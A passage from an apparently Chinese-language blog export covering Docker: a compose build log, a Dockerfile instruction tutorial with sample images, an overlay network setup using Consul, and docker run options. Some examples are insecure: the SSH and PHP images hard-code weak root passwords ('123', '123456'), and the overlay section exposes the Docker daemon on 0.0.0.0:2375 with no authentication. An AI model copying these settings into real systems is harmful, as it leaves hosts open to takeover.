[\u0026quot;bin/catalina.sh\u0026quot;,\u0026quot;run\u0026quot;]\r---\u0026gt; Running in 189b6ee0ff4e\rRemoving intermediate container 189b6ee0ff4e\r---\u0026gt; 9b444829ed55\rStep 9/9 : EXPOSE 8080\r---\u0026gt; Running in f2115bf03afb\rRemoving intermediate container f2115bf03afb\r---\u0026gt; 31c01ca93305\rSuccessfully built 31c01ca93305\rSuccessfully tagged lnmp_tomcat02:latest\rBuilding tomcat01\rStep : FROM centos\r---\u0026gt; 5182e96772bf\rStep 2/9 : MAINTAINER lc\r---\u0026gt; Using cache\r---\u0026gt; 111890e6d42e\rStep 3/9 : ADD apache-tomcat-8.5.29.tar.gz /usr/share/\r---\u0026gt; Using cache\r---\u0026gt; 46725ed86e2e\rStep 4/9 : ADD jdk-8u144-linux-x64.tar.gz /usr/share/\r---\u0026gt; Using cache\r---\u0026gt; 431ea9bb9918\rStep 5/9 : RUN mv /usr/share/apache-tomcat-8.5.29 /usr/share/tomcat\r---\u0026gt; Using cache\r---\u0026gt; 0f3919e97b50\rStep 6/9 : ENV JAVA_HOME=/usr/share/jdk1.8.0_144\r---\u0026gt; Using cache\r---\u0026gt; 5255488c51ab\rStep 7/9 : WORKDIR /usr/share/tomcat\r---\u0026gt; Using cache\r---\u0026gt; db88a81ec00a\rStep 8/9 : ENTRYPOINT [\u0026quot;bin/catalina.sh\u0026quot;,\u0026quot;run\u0026quot;]\r---\u0026gt; Using cache\r---\u0026gt; 9b444829ed55\rStep 9/9 : EXPOSE 8080\r---\u0026gt; Using cache\r---\u0026gt; 31c01ca93305\rSuccessfully built 31c01ca93305\rSuccessfully tagged lnmp_tomcat01:latest\rBuilding nginx\rStep : FROM centos\r---\u0026gt; 5182e96772bf\rStep 2/8 : MAINTAINER lc\r---\u0026gt; Using cache\r---\u0026gt; 111890e6d42e\rStep 3/8 : RUN yum install -y gcc gcc-c++ openssl-devel make pcre-devel\r---\u0026gt; Using cache\r---\u0026gt; 36090d81ef5e\rStep 4/8 : ADD nginx-1.13.9-1.el7.centos.x86_64.rpm /tmp/\r---\u0026gt; Using cache\r---\u0026gt; cecd606c7619\rStep 5/8 : RUN cd /tmp/ \u0026amp;\u0026amp; rpm -ivh nginx-1.13.9-1.el7.centos.x86_64.rpm\r---\u0026gt; Using cache\r---\u0026gt; 8c7b331fc175\rStep 6/8 : ADD nginx.conf /etc/nginx/\r---\u0026gt; 84940ae84e06\rStep 7/8 : EXPOSE 80\r---\u0026gt; Running in 94ac22711605\rRemoving intermediate container 94ac22711605\r---\u0026gt; ef10799c0844\rStep 8/8 : CMD [\u0026quot;/usr/sbin/nginx\u0026quot;, \u0026quot;-g\u0026quot;, \u0026quot;daemon off;\u0026quot;]\r---\u0026gt; Running in 039ea9de17f0\rRemoving intermediate container 039ea9de17f0\r---\u0026gt; d489d87223f8\rSuccessfully built d489d87223f8\rSuccessfully tagged lnmp_nginx:latest\r测试访问结果\n查看nginx访问日志，发现是负载到每一台tomcat上的。\n\u0026quot;172.24.0.5:8080\u0026quot; 10.0.0.1 - - [12/Aug/2018:17:52:39 +0000] \u0026quot;GET /index.jsp HTTP/1.1\u0026quot; 200 9 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.Safari/537.36\u0026quot; \u0026quot;-\u0026quot;\r\u0026quot;172.24.0.4:8080\u0026quot; 10.0.0.1 - - [12/Aug/2018:17:52:40 +0000] \u0026quot;GET /index.jsp HTTP/1.1\u0026quot; 200 9 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.Safari/537.36\u0026quot; \u0026quot;-\u0026quot;\r","permalink":"https://www.oomkill.com/2018/06/docker-compose-example/","summary":"","title":"docker-compose示例"},{"content":"一、使用前提 通用镜像未必与应用程序和配置是符合我们需要的。\n1.1 常见镜像制作方式 常见制作镜像方式有两种\n基于容器 基于镜像制作：编辑一个Dockerfile，而后根据此文件制作； 二、Dockerfile概述 Dockerfile只是构建Docker镜像的源代码，docker可以通过读取Dockerfile中的指令自动构建图像。Dockerfile是一个文本文档，其中包含用户可以在命令行上调用以组合图像的所有命令。用户可以使用 docker build 创建连续执行多个命令行指令的自动构建。\n2.1 Dockerfile的工作模式 基于Dockerfile制作镜像时，需在专用目录放置Dockerfile文件，并且文件首字母必须大写。基于Dockerfile中打包的文件必须奇基于工作目录往下走的路径。在打包镜像时，.dockeringore 文件本身与所有包含在 .dockeringore 文件中的路径，都不被打包进去。在Dockerfile制作环境为底层镜像启动容器时所能够提供的环境。\n2.2 环境变量替换 制作镜像中还可以使用环境变量。环境变量（使用ENV语句声明）也可以在某些指令中使用，因为Dockerfile环境变量在 Dockerfile 中以 $variable_name 或${variable_name}标记。\n语法还支持一些标准`bash修饰符\n${variable:-word} 表示如果设置了变量，那么结果将是该值。如果未设置变量，那么word将是结果。 ${variable+word} 表示如果设置了变量，则word将是结果，否则结果为空字符串。 三、Dockerfile指令说明 特别说明：Dockerfile中每一条指令都会生成一个新的镜像层。\nFROM FROM指令（最重要的一个），必须为Dockerfile文件开篇的第一个非注释行，用于为镜像文件构建过程指定基准镜像，后续的指令运行于此基准镜像所提供的运行环境。基准镜像可以是任何可用镜像文件，默认情况下，docker build会在docker主机上查找指定的镜像文件，在其不存在时，则会从 Docker Hub Registry 上拉取所需的镜像文件。如果找不到指定的镜像文件，docker build 会返回一个错误信息\nSyntax:\nFROM repository[:tag]\rFROM registry/repository[:tag]\rFROM resository@[digest] #←相同名称时，可以使用resository@镜像hush码指定镜像。\r参数 说明- reposotiry 某一个镜像的仓库，如redis镜像仓库。 registry docker镜像仓库，如docker hub，docker registry包含很多reposotiry，如nginx php tomcat等。不指定registry，默认从docker hub下载。 tag image的标签，为可选项，省略时默认为latest。 MAINTANIER(depreacted) MAINTANIER（depreacted）用于让Dockerfile制作者提供本人的详细信息。Dockerfile并不限制MAINTAINER指令可在出现的位置，但推荐将其放置于FROM指令之后。\nSyntax\nMAINTAINER \u0026lt;authtor's detail\u0026gt; \u0026lt;author\u0026rsquo;s detail\u0026gt; 可是任何文本信息，但约定俗成地使用作者名称及邮箱地址\nMAINTAINER \u0026quot;lc \u0026lt;12399.com@gmail.com\u0026gt;\u0026quot;\rLABLE LABLE可以提供Key value信息，比MAINTANIER具有更宽泛的使用领域。LABLE让用户提供格式各样的元数据，都是键值格式。如果在LABEL值中包含空格，请使用引号和反斜杠。image可以有多个tag。您可以在一行上指定多个tag。docker17+增加此指令。\nSyntax:\nLABEL \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt;...\rLABEL maintainer=\u0026quot;lc \u0026lt;12399.com@gmail.com\u0026gt;\u0026quot;\rCOPY 用于从宿主机工作目录将文件复制至到镜像的文件系统中。\nSyntax:\nCOPY src...dest\rCOPY \u0026quot;src\u0026quot;....\u0026quot;dest\u0026quot;\r参数 说明 src 要复制的源文件或目录，支持使用通配符。 dest 目标路径，即正在创建的image的文件系统路径；建议为dest使用绝对路径，否则，COPY指定则以WORKDIR为其起始路径。 注意：在路径中有空白字符时，通常使用第二种格式。\n文件复制准则\nsrc 必须是build上下文中的路径，不能是其父目录中的文件。 如果src是目录，则其内部文件或子目录会被递归复制，但src目录自身不会被复制。 等同于 cp a/*而不是 cp -r a 如果指定了多个src，或在src中使用了通配符，则dest必须是一个目录，且必须以/结尾。 如果dest事先不存在，它将会被自动创建，这包括其父目录路径。 ADD ADD指令类似于COPY指令，ADD支持使用TAR文件和URL路径。\nadd官方解释：ADD\n如果src是以\nSyntax:\nADD src dest\rADD [\u0026quot;src\u0026quot;…\u0026quot;dest\u0026quot;]\r操作准则同COPY指令\n如果 \u0026lt;src\u0026gt; 为URL且 \u0026lt;dest\u0026gt; 不以 / 结尾，则 \u0026lt;src\u0026gt; 指定的文件将被下载并直接被创建为dest；如果dest以/结尾，则文件名URL指定的文件将被直接下载并保存为 dest/filename\n如果src是一个本地系统上的可识别的压缩格式（identity，gzip，bzip2或xz）的本地 tar存档，则将其解压缩为目录。，其行为类似于 tar -xf 命令；然而，从URL远程网址不会自动解压。\n如果src有多个，或其间接或直接使用了通配符，则dest必须是一个以 / 结尾的目录路径；如果dest不以 / 结尾，则其被视作一个普通文件，src的内容将被直接写入到dest。\nDockerfile中每一条指令都会生成一个新的镜像层。尽量避免很多指令\nWORKDIR 用于为Dockerfile中所有的 RUN、CMD、ENTRYPOINT、COPY 和 ADD 指定设定工作目录\nSyntax:\nWORKDIR dirpath 在Dockerfile文件中，WORKDIR指令可出现多次，其路径也可以为相对路径，不过，其是相对此前一个WORKDR指令指定的路径。另外，WORKDIR也可满用由ENV指定定义的变量\n例如\nWORKDIR /var/log\rWORKDIR $STATEPATH VOLUME 用于在image中创建一个挂载点目录，以挂载Docker host上的卷或其它容器上的卷，在Dockerfile中的镜像自动指定VOLUME时，一般只能指定挂载点，不能指定宿主机文件。被称之为docker管理的卷。\nSyntax:\nVOLUME mountpoint\rVOLUME [\u0026quot;mountpoint\u0026quot;]\r如果挂载点目录路径下此前在文件存在，docker run命令会在卷挂载完成后将此前的所有文件复制到新挂载的卷中。\nEXPOSE 用于为容器打开指定要监听的端口以实现与外部通信，写在文件中的端口暴露并不会直接暴露，当docker run -P时不用声明端口，会自动读取镜像中指定要暴露的端口，动态分配到宿主机端口上。\nSyntax:\nEXPOSE port[/protocol] [port[/protocol] protocol用于指定传输层协议，可为tcp或udp二者之一，默认为TCP协议。\nEXPOSE指令可一次指定多个端口，例如\nEXPOSE 11211/udp 11211/tcp ENV 用于为镜像定义新需的环境变量，并可被Dockerfile文件中位于其后的其它指令（如ENV、ADD、COPY等）所调用格式为 $variable_name 或 ${variable_name}。在Dockerfile中所定义的所有环境变量，是可以在启动容器后直接在容器中使用的变量。在运行容器时更改ENV并不会影响docker build的值。\nSyntax:\nENV key value\rENV key1=value1 key2=value2.... 第一位格式中。key之后的所有内容均会被视作其value的组成部分，因此，一次只能设置一个变量。第二种格式可用一次设置多个变量，每个变量为一个 key=value 的键值对，如果value中包含空格，可以以反斜线（\\）进行转义，也可通过对value加引号递行标识；另外，反斜线也可用于续行。\n在定义多个变量时，建议使用第二种方式，以便在同一层中完成所有功能。\n运行命令。\nRUN 用于指定 dodker build 过程中运行的程序，其可以是任何命令。RUN可以运行多次的，如果多个命令彼此间有关联关系，建议在一条RUN中将多个Command写进来。\nSyntax:\nRUN command\rRUN [\u0026quot;executable\u0026quot;，\u0026quot;param1\u0026quot;，\u0026quot;param2\u0026quot;] 第一种格式中，command通常是一个shell命令，且以 /bin/sh -c 来运行它，这意味着此进程在容器中的PID不为1，不能接枚Unix信号，因此，当使用 docker stop container 命令停止容器时，此进程接收不到SIGTERM信号；\n第二种语法格式中的参数是一个JSON格式的数组，其中executable为要运行的命令，后面的 paramN 为传递给命令的选项或参数；然而，此种格式指定的命令不会以 /bin/sh -c 来发起，因此常见的shell操作如变量替换以及通配符（，*等）替换将不会进行；不过，如果要运行的命令依赖于此shell特性的话，可以将其替换为奏似下面的格式。\nRUN [\u0026quot;/bin/bash\u0026quot; , \u0026quot;-c\u0026quot;，\u0026quot;executable\u0026quot;, \u0026quot;param1\u0026quot;] CMD是在镜像运行为容器时没有指定默认运行命令时所运行的命令。 RUN是在基于Dockerfile构建镜像时要运行的命令。将在docker build中运行。\nCMD 类似于RUN指令，CMD指令也可用于运行任何命令或应用程序，不过，二者的运行时间点不同。RUN指令运行于镜像文件构建过程中，而CMD指令运行于基于Dockerfile构建出的新映像文件启动一个容器时\nCMD指令的首要目的在于为启动的容器指定默认要运行的程序，且其运行结束后，容器也将终止；不过，CMD指定的命令其可以被docker run的命令行选项所覆盖。在Dockerfile中可以存在多个CMD指令，但仅最后一个会生效。\nSyntax:\nCMD command\rCMD [\u0026quot;executable\u0026quot; , \u0026quot;param1\u0026quot; , \u0026quot;param2\u0026quot;] CMD [\u0026quot;param1\u0026quot; , \u0026quot;param2\u0026quot;] 使用第一种方式默认使用bin/sh -c 前两种语法格式的意义同RUN 第三种则用于为ENTRYPOINT指令提供默认参数 ENTRYPOINT 在docker run时明明指定的运行命令为nginx，但是可以执行docker run -it --rm busybox ls /，这表示了更改了镜像中默认要运行的程序。没有运行默认程序，转而运行了指定的命令。\n对于自定义的镜像而言，默认在运行容器时运行的命令是可以被覆盖的。而不允许在运行命令是改变默认命令CMD就无法完成，而ENTRYPOINT可以做到\n类似CMD指令的功能，用于为容器指定默认运行程序，从而使得容器像是一个单独的可执行程序。但是与CMD不同的是，。由ENTRYPOINT启动的程序不会被docker run命令行指定的参数所覆盖，而且，这些命令行参数会被当作参数传递给ENTRYPOINT指定的程序。当CMD和ENTRYPOINT同时存在时，CMD的内容会当做参数传给ENTRYPOINT。不过，docker run命令的\u0026ndash;entrypoint选项的参教可覆盖ENTRYPOINT指令指定的程序。\nSyntax:\nENTRYPOINT command\rENTRYPOINT [\u0026quot;executable\u0026quot;，\u0026quot;paraml\u0026quot;，\u0026quot;param2\u0026quot;] docker run命令传入的命令参数会覆盖CMD指令的内容并且附加到ENTRYPOINT命令最后做为其参数使用，Dockerfile文件中也可以存在多个ENTRYPOINT指令，但仅有最后一个会生效\n当同时CMD与ENTRYPOINT，在运行容器时传入参数会覆盖CMD，除非使用--entrypoint选项否则ENTRYPOINT不能够被覆盖。\nCMD [\u0026quot;/bin/httpd\u0026quot; , \u0026quot;-f\u0026quot; , \u0026quot;-h ${WEB00C_ROOT}\u0026quot; ]\rENTRYPOINT [\u0026quot;/bin/sh\u0026quot;,\u0026quot;-c\u0026quot;] 为什么非要同时使用CMD与ENTRYPOINT？\n多数情况下ENTRYPOINT是用来指定一个shell，指定一个谁用来作为启动别的进程的服务进程。在命令行中的参数会当做他的子进程来启动。这样就可以灵活传参数被shell所解析了。 容器接受配置要靠环境变量，要想让应用镜像（如，nginx）在run时能够通过环境变量接受参数来决定他的配置文件（监听地址、端口、document_root），变量可以在启动容器时进行传递。 #!/bin/sh\rcat \u0026gt;/etc/nginx/conf.d/www.conf \u0026lt;\u0026lt; EOF server{\rserver name ${HOSTNAME};\rlisten ${IP:-0.0.0.0}:{PORT:-80};\rroot ${NGX_DOC_ROOT:-/usr/share/nginx/html};\r}\rEOF exec \u0026quot;$@\u0026quot; FROM nginx:1.14-alpine LABEL maintainer=\u0026quot;lc \u0026lt;lc.com\u0026gt;\u0026quot;\rENV NGX_DOC_ROOT=\u0026quot;/data/web/html/\u0026quot;\rADD index.html ${NGX_DOC_ROOT}\rADD entrypoint.sh /bin/\rCMD [\u0026quot;/usr/sbin/nginx\u0026quot; , \u0026quot;-g\u0026quot; , \u0026quot;daemon off;\u0026quot; ]\rENTRYPOINT [\u0026quot;/bin/entrypoint.sh\u0026quot;]\rUSER 用于指定运行image时的或运行Dockerfile中任何RUN、CMD或ENTRYPOINT指令指定的程序时的用户名或UID，默认情况下，container的运行身份为root用户\nSyntax:\nUSER UID|UseName 需要注意的是，UID可以为任意教字，但实践中必须为 /etc/passwd 中某用户的有效UID，否则，docker run 命令将运行失败\n在基于某个镜像启动容器后，只要容器没转向后台（没停止），这个容器就不会停止。在docker引擎在判定容器健康与否并不是主进程能否提供服务，而仅仅判断进程是否运行。因此docker判断机制并不是真正意义上判断主进程的是否健康，需要其他工具来辅助确定。\nHEALTHCHECK HEALTHCHECK指令定义一个command，CMD 为固定关键词，CMD 后指定一个命令，这个命令用于检查容器主进程工作状态健康与否。即使主进程仍在运行，这也可以检测到陷入无限循环且无法处理新连接的Web服务器等情况。\nHEALTHCHECK指令有\nHEALTHCHECK [OPTIONS] CMD command # 通过在容器内运行命令来检查容器运行状况\rHEALTHCHECK NONE # 禁用任何的健康状态检查，包括默认的健康状态检测机制\r可以在CMD之前出现的选项：\n参数 说明- --interval 间隔 s秒、m分钟、h小时，default:30s。 --timeout 执行command需要时间，比如curl一个地址，如果超过timeout秒则认为超时是错误的状态，此时每次健康检查的时间是timeout+interval秒。default:30s。 --start-period 在启动容器是，对主进程自我初始化较慢的情况下，default:0s。17.05引入 --retries=N 失败次数，default:3。 当指定了健康检测状态命令，检测请求发出时，响应值为如下3种情况：\n0: 成功，容器健康且随时可用。 1: 不健康，容器无法正常工作。 2: 预留值，无意义，可以自行定义。 |HEALTHCHECK\u0026ndash;start-period=3s CMD wget-0\u0026ndash;q http://${IP:-0.0.0.0}:10080/\nFor example\nHEALTHCHECK--interval=5m --timeout=3s \\\rCMD curl -f http://locdlhost/ || exit 1 SHELL SHELL指令允许覆盖用于shell命令形式的默认shell。在Linux上的默认shell是 [\u0026quot;/bin/sh\u0026quot;,\u0026quot;-c\u0026quot;] , 在Windows上是 [\u0026quot;cmd\u0026quot; , \u0026quot;/S\u0026quot; , \u0026quot;/C\u0026quot;] 。SHELL指令必须以JSON格式写入Dockerfile。\nSHELL指令可以多次出现。每个SHELL指令覆盖先前的SHELL指令，并影响所有后续指令。\nSyntax:\nSHELL [\u0026quot;executable\u0026quot;,\u0026quot;parameters] STOHSIGNAL STOPSIGNAL指令设置将发送到容器的系统调用信号，以退出。此信号可以是与内核的系统调用表中的位置匹配的有效无符号数，例如9，或SIGNAME格式的信号名，例如SIGKILL。 语法：STOPSIGNAL signal\nARG ARG指令使用 --build-arg varname='value' 标志定义一个变量，用户可以在使用docker build命令在构建时将其传递给构建器。\n此功能使得一个Dockerfile能够适用于较多的不同场景，尤其是应用程序版本变换时。直接传参数就能确定应该基于Dockerfile制作哪个版本。如果用户指定了未在Dockerfile中定义的构建参数，则构建会输出警告。\nSyntax:\nARG name = default value\rDockerfile中可以包括一个或多个ARG指令。 ARG指令可以选择性地包括默认值： ARG version = 1.14\rARGuser = mageedu ONBUILD 用于在Dockerfile中定义一个触发器。Dockerfile用于build映像文件，此映像文件亦可作为base image被另一个Dockerfile用作FROM指令的参数，并以之构建新的映像文件\n在后面的这个Dockerfile中的FROM指令在build过程中被执行时，将会“触发”创建其base image的Dockerfile文件中的ONBUILD指令定义的触发器\nSyntax:\nONBUILD INSTRUCTION 注意：\n尽管任何指令都可注册成为触发器指令，但ONBUILD不能自我嵌套，且不会触发FROM和MAINTAINER指令。 使用包含ONBUILD指令的Dockerfle构建的镜像应该使用特殊的标签，例如ruby：2.0-onbuild 在ONBUILD指令中使用ADD或COPY指令应该格外小心，因为新构建过程的上下文在缺少指定的源文件时会失败。 四、构建php环境镜像 FROM centos:6\rMAINTAINER lc\rRUN yum install -y httpd php php-gd php-mysql mysql mysql-server\rENV MYSQL_ROOT_PASSWORD 123456\rRUN echo \u0026quot;\u0026lt;?php phpinfo()?\u0026gt;\u0026quot; \u0026gt; /var/www/html/index.php\rADD start.sh /start.sh\rRUN chmod +x /start.sh\rADD https://cn.wordpress.org/wordpress-4.7.4-zh_CN.tar.gz /var/www/html\rCOPY wp-config.php /var/www/html/wordpress\rVOLUME [\u0026quot;/var/lib/mysql\u0026quot;]\rCMD /start.sh\rEXPOSE 80 3306\r五、构建java环境镜像 FROM centos\rMAINTAINER lc\rADD jdk-8u144-linux-x64.tar.gz /usr/local\rENV JAVA_HOME=/usr/local/jdk1.8.0_144\rADD apache-tomcat-8.5.32.tar.gz /usr/local/\rRUN mv /usr/local/apache-tomcat-8.5.32 /usr/local/tomcat\rWORKDIR /usr/local/tomcat\rENTRYPOINT [\u0026quot;bin/catalina.sh\u0026quot;,\u0026quot;run\u0026quot;]\rEXPOSE 8080 六、构建ssh环境镜像 FROM centos\rMAINTAINER zhangsan\rENV PWD 123\rRUN yum install openssh openssh-server openssh-clients -y\rRUN echo $PWD|passwd --stdin root\rRUN ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key\rRUN ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key\rCMD [\u0026quot;/usr/sbin/sshd\u0026quot;,\u0026quot;-D\u0026quot;] 6.1 测试ssh镜像 systemd启动\n构建完镜像使用systemctl启动发现没有sshd进程\n$ ps\rPID TTY TIME CMD\r1 pts/0 00:00:00 bash\r18 pts/0 00:00:00 ps\r$ systemctl start ssh\rFailed to get D-Bus connection: Operation not permitted\r此问题原因：systemd服务没有启动无法使用systemd启动\nFailed to get D-Bus connection: No connection to service manager\n故启动时一般使用 CMD [\u0026quot;/usr/sbin/sshd\u0026quot;,\u0026quot;-D\u0026quot;]\n","permalink":"https://www.oomkill.com/2018/06/dockerfile/","summary":"","title":"Dockerfile使用示例"},{"content":"Docker Overlay Network Overlay网络是指在不改变现有网络基础设施的前提下，通过某种约定通信协议，把二层报文封装在IP报文之上的新的数据格式。这样不但能够充分利用成熟的IP路由协议进程数据分发；而且在Overlay技术中采用扩展的隔离标识位数，能够突破VLAN的4000数量限制支持高达16M的用户，并在必要时可将广播流量转化为组播流量，避免广播数据泛滥。\n因此，Overlay网络实际上是目前最主流的容器跨节点数据传输和路由方案。\n要想使用Docker原生Overlay网络，需要满足下列任意条件\nDocker 运行在Swarm 使用键值存储的Docker主机集群 使用键值存储搭建Docker主机集群 使用键值存储的Docker主机集群，需满足下列条件：\n集群中主机连接到键值存储，Docker支持 Consul、Etcd和Zookeeper 集群中主机运行一个Docker守护进程 集群中主机必须具有唯一的主机名，因为键值存储使用主机名来标识集群成员 集群中linux主机内核版本在3.12+,支持VXLAN数据包处理，否则可能无法通行 部署docker内置的OverLAY网络 环境准备说明 host ip- node01 10.0.0.15 node02 10.0.0.16 安装Consul 下载地址：Download Consul\n启动命令\nconsul agent -server -bootstrap -ui -data-dir /data/docker/consul \\\r-client=10.0.0.16 -bind=10.0.0.16 docker run -d -p 8400:8400 -p 8500:8500 -p 8600:53/udp -h consul progrium/consul -server -bootstrap -ui-dir /ui\r#-ui : consul 的管理界面\r#-data-dir : 数据存储\r配置docker链接consul ExecStart=/usr/bin/dockerd \\\r-H tcp://0.0.0.0:2375 \\\r-H unix:///var/run/docker.sock \\\r--cluster-store consul://10.0.0.16:8500 \\\r--cluster-advertise 10.0.0.16:2375\r创建 overlay网络 docker network create -d overlay --subnet=10.0.2.1/24 overlay-net 这边自动回进行通步，因为使用的是同一个服务器发件。\n$ docker network ls\rNETWORK ID NAME DRIVER SCOPE\r5f3ff8aceaa8 bridge bridge local\radb97c875132 docker_gwbridge bridge local\r497fb0d5ea2f host host local\r65e001b471fe none null local\rf72e6fcf1082 overlay-net overlay global\r创建使用overlay网络的容器 docker run -tid --name test2 --net=overlay-net centos\rdocker run -tid --name test3 --net=overlay-net centos\r进入查看ip信息。\nnode01\nsh-4.2# ifconfig\reth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1450\rinet 10.0.2.3 netmask 255.255.255.0 broadcast 10.0.2.255\rether 02:42:0a:00:02:03 txqueuelen 0 (Ethernet)\rRX packets 0 bytes 0 (0.0 B)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 0 bytes 0 (0.0 B)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\reth1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 172.18.0.2 netmask 255.255.0.0 broadcast 172.18.255.255\rether 02:42:ac:12:00:02 txqueuelen 0 (Ethernet)\rRX packets 3192 bytes 12218706 (11.6 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 2569 bytes 142308 (138.9 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536\rinet 127.0.0.1 netmask 255.0.0.0\rloop txqueuelen 1 (Local Loopback)\rRX packets 76 bytes 6960 (6.7 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 76 bytes 6960 (6.7 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rnode02\nsh-4.2# ifconfig\reth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1450\rinet 10.0.2.2 netmask 255.255.255.0 broadcast 10.0.2.255\rether 02:42:0a:00:02:02 txqueuelen 0 (Ethernet)\rRX packets 4 bytes 336 (336.0 B)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 4 bytes 336 (336.0 B)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\reth1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 172.18.0.2 netmask 255.255.0.0 broadcast 172.18.255.255\rether 02:42:ac:12:00:02 txqueuelen 0 (Ethernet)\rRX packets 2753 bytes 12193675 (11.6 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 2345 bytes 130189 (127.1 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536\rinet 127.0.0.1 netmask 255.0.0.0\rloop txqueuelen 1 (Local Loopback)\rRX packets 78 bytes 6884 (6.7 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 78 bytes 6884 (6.7 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\r测试网络\n$ ping 10.0.2.3\rPING 10.0.2.3 (10.0.2.3) 56(84) bytes of data.\r64 bytes from 10.0.2.3: icmp_seq=1 ttl=64 time=0.349 ms\r$ ping 10.0.2.2\rPING 10.0.2.2 (10.0.2.2) 56(84) bytes of data.\r64 bytes from 10.0.2.2: icmp_seq=1 ttl=64 time=0.023 ms\r","permalink":"https://www.oomkill.com/2018/06/docker-cross-node-network/","summary":"","title":"Docker跨宿主机网络通信"},{"content":" 参数 说明 -i, \u0026ndash;interactive 即使不是交互模式也保持stdin打开 -d, \u0026ndash;detach 后台运行容器并打印容器ID -t, \u0026ndash;tty 分配一个伪TTY 添加自定义主机映射\n$ docker run -tid --add-host docker-node:10.0.0.1 centos\r61d5824c720f1a32c743a3d0f434e17a7f6860dba1cb5559653a80c064da8073\r$ docker exec 61d5824c720f1a32c cat /etc/hosts\rff02::2\tip6-allrouters\r10.0.0.1\tdocker-node\r172.17.0.2\t61d5824c720f\r添加linux功能\nlinux内核特性，提供权限访问控制。如需要特殊权限，不赋权限容器将不能正常运行。\n将容器pid写入一个文件内\n$ docker run -itd --cidfile /tmp/pid centos\r458d9f4b3cc51a4f0f3abffbc78c643b98a89eef3cdfe263e762ac05d3f5f47d\r$ cat /tmp/pid 458d9f4b3cc51a4f0f3abffbc78c643b98a89eef3cdfe263e762ac05d3f5f47d\r将主机列表添加到容器中\n--device list 设置自定义dns\n$ docker run -it centos cat /etc/resolv.conf\rnameserver 10.0.0.2\rnameserver 10.0.0.2\r$ docker run -it --dns 8.8.8.8 centos cat /etc/resolv.conf\rnameserver 8.8.8.8\r设置容器的环境变量\n$ docker run -itd -e \u0026quot;TEST=abc\u0026quot; centos\r2d3ef722737a0a034151060ef2d8e97b21feee7590917a0e921c21e864d18a47\r$ docker attach 2d3ef722737a0\r$ echo $TEST\rabc\r暴露端口或指定范围的端口号\n$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rf7fd3f365512 centos \u0026quot;/bin/bash\u0026quot; 5 seconds ago Up 5 seconds 8080/tcp wonderful_golick\r为容器指定主机名\n$ docker run -itd -h nginx centos\rbdcdf43bf4540d1a9bb794042c6d506c2680be0eab317002697a8049c5667716\r$ docker exec bdcdf43bf4540 hostname\rnginx\r为容器分配ip\n创建网络\n$ docker network create --subnet=10.10.0.0/24 network_test\r85d5f3e2cd09e2bd57bc68b56c9341f5b1d4cc1194641715937d8e197cca09f7\r查看网络\n$ docker network ls\rNETWORK ID NAME DRIVER SCOPE\r6af203aae34e bridge bridge local\rb20cfc0864e6 host host local\r85d5f3e2cd09 network_test bridge local\rc287f5c1181e none null local\r删除网络\n$ docker network rm network_test\rnetwork_test\r指定容器网络\n$ docker run -idt --net=network_test --ip 10.10.0.3 -h network centos\rad885aebe13fa244748c040121f849385ae5b3b8d243f76cb43695495f20c301\r查看容器信息 \u0026quot;Networks\u0026quot;: {\r\u0026quot;network_test\u0026quot;: {\r\u0026quot;IPAMConfig\u0026quot;: {\r\u0026quot;IPv4Address\u0026quot;: \u0026quot;10.10.0.3\u0026quot;\r},\r\u0026quot;Links\u0026quot;: null,\r\u0026quot;Aliases\u0026quot;: [\r\u0026quot;ad885aebe13f\u0026quot;\r],\r\u0026quot;NetworkID\u0026quot;: \u0026quot;c1196614dc1eec93c34774f9498ea3254084e1\u0026quot;,\r\u0026quot;EndpointID\u0026quot;: \u0026quot;a1c491b6155b104ac70194d9b1fa7ab84b6d4\u0026quot;,\r\u0026quot;Gateway\u0026quot;: \u0026quot;10.10.0.1\u0026quot;,\r\u0026quot;IPAddress\u0026quot;: \u0026quot;10.10.0.3\u0026quot;,\r\u0026quot;IPPrefixLen\u0026quot;: 24,\r\u0026quot;IPv6Gateway\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;GlobalIPv6Address\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;GlobalIPv6PrefixLen\u0026quot;: 0,\r\u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:0a:0a:00:03\u0026quot;\r}\rlink建立容器之间的连接\n$ docker run -tid --name centos centos\r8f6e13a26afe60ee2ac5335d419852d70580343f590c2500964f54020e54391c\r$ docker exec centos ifconfig\reth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255\r$ docker run -tid --name link --link 